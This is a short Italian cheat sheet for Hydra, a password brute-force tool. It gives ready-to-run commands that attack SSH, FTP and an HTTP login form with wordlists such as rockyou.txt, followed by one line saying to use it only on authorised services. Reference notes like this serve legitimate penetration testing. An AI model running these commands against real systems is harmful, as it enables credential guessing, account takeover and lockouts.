# Hydra - brute force di servizi di login

## Uso base
```
hydra -l admin -P rockyou.txt ssh://192.168.1.10
hydra -L utenti.txt -P pass.txt ftp://192.168.1.10
hydra -l admin -P pass.txt 10.0.0.5 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorretto"
```

## Legale
Solo su servizi autorizzati: i tentativi possono bloccare account/IP.
